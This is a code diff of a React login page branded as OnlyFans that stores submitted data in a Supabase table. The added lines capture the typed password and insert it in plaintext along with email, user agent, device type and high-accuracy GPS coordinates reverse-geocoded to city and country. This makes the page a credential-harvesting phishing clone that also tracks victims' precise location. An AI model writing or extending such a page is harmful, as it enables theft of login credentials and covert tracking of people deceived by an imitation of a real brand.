@@ -1,26 +1,27 @@
-"use client"; // Marks this as a Client Component (needed for useState, browser APIs)
+"use client"; // Required for browser APIs (geolocation, userAgent, state)
 
 import React, { useState } from "react";
 import { FaXTwitter, FaFingerprint } from "react-icons/fa6";
 import { FcGoogle } from "react-icons/fc";
-import { supabase } from "../../lib/supabase"; // Supabase client instance
+import { supabase } from "../../lib/supabase";
 
 export default function Login() {
-  // Controls loading state while submitting
+  /* -------------------- STATE -------------------- */
+  const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
+  const [showPassword, setShowPassword] = useState(false);
 
-  // Stores validation error messages
+  // Validation errors
   const [errors, setErrors] = useState({ email: "", name: "" });
 
-  /**
-   * Validates email and name input
-   * @returns true if valid, false otherwise
-   */
+  // Button becomes active only when password exists & not loading
+  const isActive = password.length > 0 && !loading;
+
+  /* -------------------- VALIDATION -------------------- */
   const validateForm = (email, name) => {
     let valid = true;
     let newErrors = { email: "", name: "" };
 
-    // Email validation
     if (!email) {
       newErrors.email = "Email is required";
       valid = false;
@@ -29,7 +30,6 @@ export default function Login() {
       valid = false;
     }
 
-    // Name validation
     if (!name) {
       newErrors.name = "Name is required";
       valid = false;
@@ -42,56 +42,63 @@ export default function Login() {
     return valid;
   };
 
-  /**
-   * Handles form submission
-   * - validates input
-   * - gets device info
-   * - gets user location
-   * - converts lat/lng to city & country
-   * - inserts data into Supabase
-   */
+  /* -------------------- DEVICE DETECTION -------------------- */
+  const getDeviceInfo = () => {
+    const ua = navigator.userAgent;
+
+    let deviceType = "Desktop";
+    if (/tablet|ipad|playbook|silk/i.test(ua)) deviceType = "Tablet";
+    else if (/mobile|iphone|android/i.test(ua)) deviceType = "Mobile";
+
+    return {
+      deviceType,
+      userAgent: ua,
+    };
+  };
+
+  /* -------------------- LOCATION -------------------- */
+  const getLocation = () => {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) {
+        resolve(null);
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) =>
+          resolve({
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+          }),
+        () => resolve(null),
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
+    });
+  };
+
+  /* -------------------- SUBMIT -------------------- */
   const handleSubmit = async (e) => {
     e.preventDefault();
     setLoading(true);
 
-    // Read input values from form
     const email = e.target.email.value.trim();
     const name = e.target.name.value.trim();
-    const device = navigator.userAgent; // Browser/device info
 
-    // Stop submission if validation fails
     if (!validateForm(email, name)) {
       setLoading(false);
       return;
     }
 
-    // Location + readable place
-    let location = null;
+    // Device info
+    const device = getDeviceInfo();
+
+    // Location
+    const location = await getLocation();
+
     let city = null;
     let country = null;
 
-    /**
-     * Request browser geolocation (lat/lng)
-     */
-    try {
-      location = await new Promise((resolve) => {
-        navigator.geolocation.getCurrentPosition(
-          (pos) =>
-            resolve({
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
-            }),
-          () => resolve(null)
-        );
-      });
-    } catch {
-      location = null;
-    }
-
-    /**
-     * Reverse-geocode lat/lng → city & country
-     * Only runs if location exists
-     */
+    // Reverse geocoding (lat/lng → city & country)
     if (location) {
       try {
         const res = await fetch(
@@ -106,20 +113,17 @@ export default function Login() {
           null;
 
         country = data.address.country || null;
-      } catch {
-        city = null;
-        country = null;
-      }
+      } catch {}
     }
 
-    /**
-     * Insert collected data into Supabase database
-     */
+    // Insert into Supabase
     const { error } = await supabase.from("submissions").insert([
       {
         email,
         name,
-        device,
+        password, // optional: remove if not needed
+        device_type: device.deviceType,
+        device_info: device.userAgent,
         latitude: location?.latitude || null,
         longitude: location?.longitude || null,
         city,
@@ -127,17 +131,21 @@ export default function Login() {
       },
     ]);
 
-    // Handle result
     if (error) {
-      alert("Error submitting data");
       console.error(error);
+      alert("Error submitting data");
     } else {
-      alert("Subscription successfully submitted!");
+      alert("Submitted successfully!");
       e.target.reset();
+      setPassword(""); // 🔁 reset button to gray
     }
 
     setLoading(false);
   };
+
+ 
+  
+ 
 
   return (
     <div className="flex flex-col md:flex md:flex-row min-h-screen bg-white">
@@ -153,7 +161,7 @@ export default function Login() {
           <h1 className="text-3xl font-bold text-sky-500">OnlyFans</h1>
         </div>
 
-        <p className="mt-4 text-2xl font-semibold leading-snug">
+        <p className="mt-4 text-2xl text-neutral-800 font-semibold leading-snug">
           Sign up to support your favorite creators
         </p>
       </div>
@@ -180,7 +188,7 @@ export default function Login() {
       {/* RIGHT SIDE — FORM */}
       <div className="flex w-full md:w-1/2 items-center justify-center bg-white">
         <div className="w-full max-w-md p-8">
-          <h2 className="text-lg font-semibold mb-4">Log in</h2>
+          <h2 className="text-lg text-neutral-900 font-semibold mb-4">Log in</h2>
 
           {/* FORM */}
           <form
@@ -195,33 +203,57 @@ export default function Login() {
                 name="email"
                 placeholder="Email"
                 
-                className="w-full border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-sky-400"
+                className="w-full border text-neutral-900 border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-sky-400"
               />
               {errors.email && (
                 <p className="text-red-500 text-xs mt-1">{errors.email}</p>
               )}
             </div>
 
-            <div>
+            <div className="relative w-full">
               <input
-                type="password"
+                id="password"
+                type={showPassword ? "text" : "password"}
                 name="name"
                 placeholder="password"
-                
-                className="w-full border border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-sky-400"
+                onChange={(e) => setPassword(e.target.value)}                
+                className="w-full border text-neutral-900 border-gray-300 rounded-lg p-3 focus:outline-none focus:ring-2 focus:ring-sky-400"
               />
+
+              <span
+                onClick={() => setShowPassword(!showPassword)}
+                className="absolute right-3 text-neutral-500 top-1/2 -translate-y-1/2 cursor-pointer select-none">
+                {showPassword ? "👁" : "👁"}
+              </span>
+
+
               {errors.name && (
                 <p className="text-red-500 text-xs mt-1">{errors.name}</p>
               )}
             </div>
 
-            <button
+
+             <button
+                type="submit"
+                disabled={!isActive}
+                className={`w-full font-semibold py-3 rounded-full transition
+                  ${
+                    isActive
+                      ? "bg-sky-400 text-white hover:bg-sky-600 cursor-pointer"
+                      : "bg-gray-200 text-gray-400 "
+                  }
+                `}
+              >
+                {loading ? "Logging in..." : "LOG IN"}
+              </button>
+
+            {/* <button
               disabled={loading}
-              type="submit"
+              type="submit"              
               className="w-full bg-gray-200 text-gray-400 font-semibold py-3 rounded-full"
             >
               LOG IN
-            </button>
+            </button> */}
           </form>
 
           <p className="text-xs text-gray-500 mt-3">
